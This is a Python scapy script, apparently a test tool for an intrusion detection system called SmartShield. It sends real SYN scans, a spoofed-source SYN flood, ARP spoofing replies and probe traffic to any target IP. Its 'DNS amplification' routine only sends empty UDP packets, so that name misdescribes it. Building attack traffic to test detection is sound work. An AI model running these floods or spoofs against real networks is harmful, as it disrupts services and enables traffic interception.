"""Attack simulation tools for testing SmartShield."""
import argparse
import time
import random
import socket
from scapy.all import send, IP, TCP, UDP, ICMP, ARP, Ether, RandIP, RandMAC
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('AttackSimulator')

class AttackSimulator:
    """Simulate various network attacks for testing."""
    
    def __init__(self):
        self.packets_sent = 0
    
    def simulate_port_scan(self, target_ip, ports=None, count=100):
        """Simulate port scanning attack."""
        logger.info(f"Simulating port scan attack on {target_ip}")
        
        if ports is None:
            ports = [22, 23, 80, 443, 8080, 3306, 5432, 3389]
        
        for _ in range(count):
            try:
                # Random source port, specific destination port
                packet = IP(dst=target_ip) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=random.choice(ports),
                    flags='S'  # SYN flag for TCP scan
                )
                send(packet, verbose=0)
                self.packets_sent += 1
                time.sleep(0.1)
            except Exception as e:
                logger.error(f"Error sending packet: {e}")
        
        logger.info(f"Sent {self.packets_sent} port scan packets")
    
    def simulate_ddos(self, target_ip, duration=60):
        """Simulate DDoS attack."""
        logger.info(f"Simulating DDoS attack on {target_ip} for {duration}s")
        
        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                # Random source IP with SYN flooding
                packet = IP(src=RandIP(), dst=target_ip) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=80,
                    flags='S'
                )
                send(packet, verbose=0)
                self.packets_sent += 1
            except Exception as e:
                logger.error(f"Error sending packet: {e}")
        
        logger.info(f"Sent {self.packets_sent} DDoS packets")
    
    def simulate_arp_spoof(self, target_ip, gateway_ip, count=50):
        """Simulate ARP spoofing attack."""
        logger.info(f"Simulating ARP spoof attack: {target_ip} <-> {gateway_ip}")
        
        # Get MAC address of gateway (simplified)
        try:
            for _ in range(count):
                # ARP reply spoofing
                packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
                send(packet, verbose=0)
                self.packets_sent += 1
                time.sleep(0.2)
        except Exception as e:
            logger.error(f"Error in ARP spoof: {e}")
        
        logger.info(f"Sent {self.packets_sent} ARP spoof packets")
    
    def simulate_dns_amplification(self, target_ip, count=100):
        """Simulate DNS amplification attack."""
        logger.info(f"Simulating DNS amplification on {target_ip}")
        
        for _ in range(count):
            try:
                # UDP flood with DNS queries
                packet = IP(dst=target_ip) / UDP(
                    sport=random.randint(1024, 65535),
                    dport=53
                )
                send(packet, verbose=0)
                self.packets_sent += 1
            except Exception as e:
                logger.error(f"Error sending packet: {e}")
        
        logger.info(f"Sent {self.packets_sent} DNS amplification packets")
    
    def simulate_reconnaissance(self, target_ip, count=200):
        """Simulate reconnaissance activity."""
        logger.info(f"Simulating reconnaissance on {target_ip}")
        
        for _ in range(count):
            try:
                # Mix of different packets
                attack_type = random.choice(['icmp', 'tcp', 'udp'])
                
                if attack_type == 'icmp':
                    packet = IP(dst=target_ip) / ICMP(type=8)
                elif attack_type == 'tcp':
                    packet = IP(dst=target_ip) / TCP(
                        sport=random.randint(1024, 65535),
                        dport=random.randint(1, 1024)
                    )
                else:  # udp
                    packet = IP(dst=target_ip) / UDP(
                        sport=random.randint(1024, 65535),
                        dport=random.randint(1, 1024)
                    )
                
                send(packet, verbose=0)
                self.packets_sent += 1
                time.sleep(0.05)
            except Exception as e:
                logger.error(f"Error sending packet: {e}")
        
        logger.info(f"Sent {self.packets_sent} reconnaissance packets")

def main():
    """Main entry point for attack simulator."""
    parser = argparse.ArgumentParser(description='SmartShield Attack Simulator')
    parser.add_argument('--type', type=str, required=True,
                        choices=['port-scan', 'ddos', 'arp-spoof', 'dns-amplification', 'reconnaissance'],
                        help='Type of attack to simulate')
    parser.add_argument('--target', type=str, required=True,
                        help='Target IP address')
    parser.add_argument('--gateway', type=str,
                        help='Gateway IP (required for ARP spoof)')
    parser.add_argument('--count', type=int, default=100,
                        help='Number of packets to send')
    parser.add_argument('--duration', type=int, default=60,
                        help='Duration in seconds (for DDoS)')
    
    args = parser.parse_args()
    
    simulator = AttackSimulator()
    
    try:
        if args.type == 'port-scan':
            simulator.simulate_port_scan(args.target, count=args.count)
        elif args.type == 'ddos':
            simulator.simulate_ddos(args.target, duration=args.duration)
        elif args.type == 'arp-spoof':
            if not args.gateway:
                parser.error("--gateway is required for ARP spoof attack")
            simulator.simulate_arp_spoof(args.target, args.gateway, count=args.count)
        elif args.type == 'dns-amplification':
            simulator.simulate_dns_amplification(args.target, count=args.count)
        elif args.type == 'reconnaissance':
            simulator.simulate_reconnaissance(args.target, count=args.count)
        
        logger.info(f"Simulation complete. Total packets sent: {simulator.packets_sent}")
    except KeyboardInterrupt:
        logger.info("Simulation interrupted by user")
    except Exception as e:
        logger.error(f"Simulation error: {e}")

if __name__ == '__main__':
    main()


